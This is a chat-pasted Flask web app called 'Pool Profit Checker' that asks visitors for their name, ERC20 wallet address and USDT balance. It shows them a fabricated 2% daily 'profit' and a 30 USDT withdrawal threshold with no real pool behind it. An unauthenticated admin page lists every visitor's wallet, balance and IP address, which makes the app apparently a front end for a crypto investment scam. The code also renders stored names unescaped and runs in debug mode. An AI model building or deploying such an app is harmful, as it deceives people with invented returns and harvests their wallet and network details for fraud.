𝓝𝓪𝓲 🦢, [12/28/2025 12:45 PM]
from flask import Flask, request, redirect, url_for, render_template_string
import sqlite3
from datetime import datetime, date

app = Flask(__name__)

DB = "database.db"

# ---------------- DATABASE ----------------
def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            wallet TEXT UNIQUE,
            balance REAL,
            profit REAL DEFAULT 0,
            last_check TEXT,
            ip TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

# ---------------- HTML ----------------
HTML = """
<!DOCTYPE html>
<html>
<head>
<title>Pool Profit Checker</title>
<style>
body {
    background-image: url('/static/bg.png');
    background-size: cover;
    font-family: Arial;
}
.box {
    background: rgba(0,0,0,0.7);
    padding: 20px;
    width: 350px;
    margin: 100px auto;
    color: white;
    border-radius: 10px;
}
input, button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
}
.error { color: red; }
.success { color: lightgreen; }
</style>
</head>
<body>
<div class="box">
<h2>Pool Profit Check</h2>
<form method="POST">
<input name="name" placeholder="Your Name" required>
<input name="wallet" placeholder="ERC20 Wallet Address" required>
<input name="balance" type="number" step="0.01" placeholder="USDT Balance" required>
<button type="submit">Check Profit</button>
</form>

{% if msg %}
<p class="{{ cls }}">{{ msg }}</p>
{% endif %}
</div>
</body>
</html>
"""

# ---------------- LOGIC ----------------
@app.route("/", methods=["GET", "POST"])
def home():
    msg = ""
    cls = ""

    if request.method == "POST":
        name = request.form["name"].strip()
        wallet = request.form["wallet"].strip()
        balance = float(request.form["balance"])
        ip = request.remote_addr
        today = str(date.today())

        if not wallet.startswith("0x") or len(wallet) != 42:
            msg = "Invalid wallet address. Please provide a valid ERC20 address."
            cls = "error"
            return render_template_string(HTML, msg=msg, cls=cls)

        if balance <= 0:
            msg = "Wallet balance is 0. Please check your wallet address."
            cls = "error"
            return render_template_string(HTML, msg=msg, cls=cls)

        conn = sqlite3.connect(DB)
        c = conn.cursor()
        c.execute("SELECT profit, last_check FROM users WHERE wallet=?", (wallet,))
        row = c.fetchone()

        daily_rate = 0.02  # 2%

        if row:
            profit, last_check = row
            if last_check != today:
                profit += balance * daily_rate
                c.execute("""
                    UPDATE users
                    SET profit=?, balance=?, last_check=?, ip=?
                    WHERE wallet=?
                """, (profit, balance, today, ip, wallet))
        else:
            profit = balance * daily_rate
            c.execute("""
                INSERT INTO users (name, wallet, balance, profit, last_check, ip)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (name, wallet, balance, profit, today, ip))

        conn.commit()
        conn.close()

        msg = f"Your total profit: {profit:.2f} USDT<br>"
        if profit < 30:
            msg += "⚠ Your wallet balance is low. You must reach 30 USDT profit to withdraw."
            cls = "error"
        else:
            msg += "✅ You are eligible for withdrawal."
            cls = "success"

    return render_template_string(HTML, msg=msg, cls=cls)

# ---------------- ADMIN PANEL ----------------
@app.route("/admin")
def admin():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT name, wallet, balance, profit, last_check, ip FROM users")
    users = c.fetchall()
    conn.close()

    return """
    <h2>Admin Panel</h2>
    <table border=1 cellpadding=5>
    <tr>
    <th>Name</th><th>Wallet</th><th>Balance</th>
    <th>Profit</th><th>Last Check</th><th>IP</th>
    </tr>
    """ + "".join(
f"<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[2]}</td><td>{u[3]:.2f}</td><td>{u[4]}</td><td>{u[5]}</td></tr>"
        for u in users
    ) + "</table>"

# ---------------- RUN ----------------
if __name__ == "__main__":
    app.run(debug=True)
